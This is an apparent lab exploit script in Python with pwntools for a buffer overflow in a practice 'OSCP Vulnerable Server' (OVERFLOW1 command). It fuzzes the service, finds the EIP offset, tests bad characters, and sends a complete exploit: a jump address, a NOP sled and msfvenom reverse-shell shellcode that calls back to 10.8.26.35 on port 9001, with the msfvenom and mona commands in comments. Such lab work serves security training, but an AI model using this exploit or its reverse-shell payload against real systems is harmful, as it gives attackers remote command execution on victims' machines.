from pwn import *

def fuzzing(ip , port):
    prefix = "OVERFLOW1 "#This is the prefix of that code
    count = 100 #it will send this much of junk initially
    while True:
        connection = remote(ip , port)#Opening a connection
        connection.recvuntil("Welcome to OSCP Vulnerable Server! Enter HELP for help.")#Waiting for this value.It will wait untill this response comes from the port
        print("Number of Padding ==> " + str(count) + "\n")
        junk = "A" * count #This junk will be sent to that port
        connection.send(prefix + junk + "\n") #sending the data
        count += 100 #each time incrementing 100 to the number of A's
        connection.close() #closing the connection
def eip_check(ip , port):
    prefix = "OVERFLOW1 "#This is the prefix of that code
    connection = remote(ip , port)#Opening a connection
    connection.recvuntil("Welcome to OSCP Vulnerable Server! Enter HELP for help.")#Waiting for this value.It will wait untill this response comes from the port
    print("\nSending Pattern\n")
    #Pattern made using msf-pattern_create
    # msf-pattern_create -l 2000
    pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"
    connection.send(prefix + pattern + "\n") #sending the data
    connection.close() #closing the connection
def badchar_finder(ip , port):
    prefix = "OVERFLOW1 " #This is the prefix of that code
    connection = remote(ip , port) #Opening a connection
    connection.recvuntil("Welcome to OSCP Vulnerable Server! Enter HELP for help.")#Waiting for this value.It will wait untill this response comes from the port
    print("\nSending Chars\n")
    offset = 1978 ###We got this after cracking that hex value which overwrote the EIP when we ran that eip_check.the data which overwrote EIP is "6F43396E"
    junk = "A" * offset
    eip_padding = "B" * 4
    #### We searched online and got a badchars for python and send it.to find which characters are not allowed
    badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
    connection.send(prefix + junk + eip_padding + badchars + "\n") #sending the data
    connection.close() #closing the connection'''
def exploit(ip , port):
    prefix = "OVERFLOW1 " #This is the prefix of that code
    connection = remote(ip , port) #Opening a connection
    connection.recvuntil("Welcome to OSCP Vulnerable Server! Enter HELP for help.")#Waiting for this value.It will wait untill this response comes from the port
    print("\nSending Payload\n")
    offset = 1978
    junk = "A" * offset
    retn = "\xaf\x11\x50\x62" # Now for this one which is a jump point we use mone |  !mona jmp -r esp -cpb "\x00\x07\x2e\xa0" | and we reversed that data by beacause its using little endian
    buf =  "" #metasploit exploit made using msfvenom | msfvenom -p windows/shell_reverse_tcp LHOST=10.8.26.35 LPORT=9001 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f py 
    padding = "\x90" * 16 #Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes but we have to check manually which one will work
    buf += "\xda\xd4\xd9\x74\x24\xf4\x5f\x2b\xc9\xb8\x4c\x40\x4b"
    buf += "\xb4\xb1\x52\x31\x47\x17\x83\xc7\x04\x03\x0b\x53\xa9"
    buf += "\x41\x6f\xbb\xaf\xaa\x8f\x3c\xd0\x23\x6a\x0d\xd0\x50"
    buf += "\xff\x3e\xe0\x13\xad\xb2\x8b\x76\x45\x40\xf9\x5e\x6a"
    buf += "\xe1\xb4\xb8\x45\xf2\xe5\xf9\xc4\x70\xf4\x2d\x26\x48"
    buf += "\x37\x20\x27\x8d\x2a\xc9\x75\x46\x20\x7c\x69\xe3\x7c"
    buf += "\xbd\x02\xbf\x91\xc5\xf7\x08\x93\xe4\xa6\x03\xca\x26"
    buf += "\x49\xc7\x66\x6f\x51\x04\x42\x39\xea\xfe\x38\xb8\x3a"
    buf += "\xcf\xc1\x17\x03\xff\x33\x69\x44\x38\xac\x1c\xbc\x3a"
    buf += "\x51\x27\x7b\x40\x8d\xa2\x9f\xe2\x46\x14\x7b\x12\x8a"
    buf += "\xc3\x08\x18\x67\x87\x56\x3d\x76\x44\xed\x39\xf3\x6b"
    buf += "\x21\xc8\x47\x48\xe5\x90\x1c\xf1\xbc\x7c\xf2\x0e\xde"
    buf += "\xde\xab\xaa\x95\xf3\xb8\xc6\xf4\x9b\x0d\xeb\x06\x5c"
    buf += "\x1a\x7c\x75\x6e\x85\xd6\x11\xc2\x4e\xf1\xe6\x25\x65"
    buf += "\x45\x78\xd8\x86\xb6\x51\x1f\xd2\xe6\xc9\xb6\x5b\x6d"
    buf += "\x09\x36\x8e\x22\x59\x98\x61\x83\x09\x58\xd2\x6b\x43"
    buf += "\x57\x0d\x8b\x6c\xbd\x26\x26\x97\x56\x43\xbf\x8d\x85"
    buf += "\x3b\xbd\xb1\xea\x92\x48\x57\x86\xf4\x1c\xc0\x3f\x6c"
    buf += "\x05\x9a\xde\x71\x93\xe7\xe1\xfa\x10\x18\xaf\x0a\x5c"
    buf += "\x0a\x58\xfb\x2b\x70\xcf\x04\x86\x1c\x93\x97\x4d\xdc"
    buf += "\xda\x8b\xd9\x8b\x8b\x7a\x10\x59\x26\x24\x8a\x7f\xbb"
    buf += "\xb0\xf5\x3b\x60\x01\xfb\xc2\xe5\x3d\xdf\xd4\x33\xbd"
    buf += "\x5b\x80\xeb\xe8\x35\x7e\x4a\x43\xf4\x28\x04\x38\x5e"
    buf += "\xbc\xd1\x72\x61\xba\xdd\x5e\x17\x22\x6f\x37\x6e\x5d"  
    buf += "\x40\xdf\x66\x26\xbc\x7f\x88\xfd\x04\x9f\x6b\xd7\x70"
    buf += "\x08\x32\xb2\x38\x55\xc5\x69\x7e\x60\x46\x9b\xff\x97"
    buf += "\x56\xee\xfa\xdc\xd0\x03\x77\x4c\xb5\x23\x24\x6d\x9c"

    connection.send(prefix + junk + retn + padding + buf + "\n") #sending the payload
    connection.close() #closing the connection'''

#### FUZZING will give us a location around which programming is crashing in this case it is 2000,where the program got crashed####        
#fuzzing("10.10.232.34" , 1337)

### We made a pattern using msf-pattern_create of 2000 chars because around 2000 program got crashed
#eip_check("10.10.79.116" , 1337)


#### Now we got a part of that pattern on that exploit which overwrote the EIP in our case it is "6F43396E" 
#### now using msf-pattern_offset we got the exact location after which EIP will be overwritten
#### msf-pattern_create -q "6F43396E"  
# badchar_finder("10.10.193.113" , 1337)



#### So manually searching those badchars we got this "\x00\x07\x2e\xa0",we made a exploit using msfvenom without using this bad characters 
## msfvenom -p windows/shell_reverse_tcp LHOST=10.8.26.35 LPORT=9001 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f py
#### And using mona.py and bad chars we found out where is that JUMP POINT 
## !mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
####and we got a jump point "625011af" which is basically written in reverse beacause it will reverse everthing and reversing a reverse data gives that exact data so the data is  "\xaf\x11\x50\x62"
#exploit("10.10.232.34" , 1337)